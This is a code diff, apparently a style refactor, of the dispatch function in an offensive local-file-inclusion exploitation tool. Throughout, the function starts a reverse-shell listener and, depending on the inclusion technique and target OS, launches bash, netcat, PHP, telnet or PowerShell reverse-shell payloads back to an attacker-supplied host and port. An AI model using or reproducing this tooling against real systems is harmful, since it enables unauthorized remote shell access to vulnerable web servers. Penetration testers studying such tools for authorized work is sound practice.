@@ -13,6 +13,7 @@ from src.httpreqs.get import GET
 from src.servers.LFIshell import start_listener
 import threading
 
+
 def pwn(exploit):
 
     # Starting the reverse shell listener
@@ -21,11 +22,11 @@ def pwn(exploit):
 
     ip = args.lhost
     port = args.lport
-    method = exploit['ATTACK_METHOD']
+    method = exploit["ATTACK_METHOD"]
 
-    if(method == "INPUT"):
-        exploit['OS'] = "linux"
-        if(exploit['OS'] == "linux"):
+    if method == "INPUT":
+        exploit["OS"] = "linux"
+        if exploit["OS"] == "linux":
             exploit_bash(exploit, "INPUT", ip, port)
             exploit_nc(exploit, "INPUT", ip, port)
             exploit_php(exploit, "INPUT", ip, port)
@@ -34,8 +35,8 @@ def pwn(exploit):
         else:
             exploit_powershell(exploit, "INPUT", ip, port)
 
-    elif(method == "DATA"):
-        if(exploit['OS'] == "linux"):
+    elif method == "DATA":
+        if exploit["OS"] == "linux":
             exploit_bash(exploit, "DATA", ip, port)
             exploit_nc(exploit, "DATA", ip, port)
             exploit_php(exploit, "DATA", ip, port)
@@ -44,8 +45,8 @@ def pwn(exploit):
         else:
             exploit_powershell(exploit, "DATA", ip, port)
 
-    elif(method == "EXPECT"):
-        if(exploit['OS'] == "linux"):
+    elif method == "EXPECT":
+        if exploit["OS"] == "linux":
             exploit_bash(exploit, "EXPECT", ip, port)
             exploit_nc(exploit, "EXPECT", ip, port)
             exploit_php(exploit, "EXPECT", ip, port)
@@ -54,11 +55,12 @@ def pwn(exploit):
         else:
             exploit_powershell(exploit, "EXPECT", ip, port)
 
-    elif(method == "RFI"):
-        if(exploit_rfi(exploit, "RFI", ip, port)): return
-    
-    elif(method == "TRUNC"):
-        if(exploit['OS'] == "linux"):
+    elif method == "RFI":
+        if exploit_rfi(exploit, "RFI", ip, port):
+            return
+
+    elif method == "TRUNC":
+        if exploit["OS"] == "linux":
             exploit_bash(exploit, "TRUNC", ip, port)
             exploit_nc(exploit, "TRUNC", ip, port)
             exploit_php(exploit, "TRUNC", ip, port)
@@ -66,9 +68,9 @@ def pwn(exploit):
             exploit_telnet(exploit, "TRUNC", ip, port)
         else:
             exploit_powershell(exploit, "TRUNC", ip, port)
-    
-    elif(method == "CMD"):
-        if(exploit['OS'] == "linux"):
+
+    elif method == "CMD":
+        if exploit["OS"] == "linux":
             exploit_bash(exploit, "CMD", ip, port)
             exploit_nc(exploit, "CMD", ip, port)
             exploit_php(exploit, "CMD", ip, port)
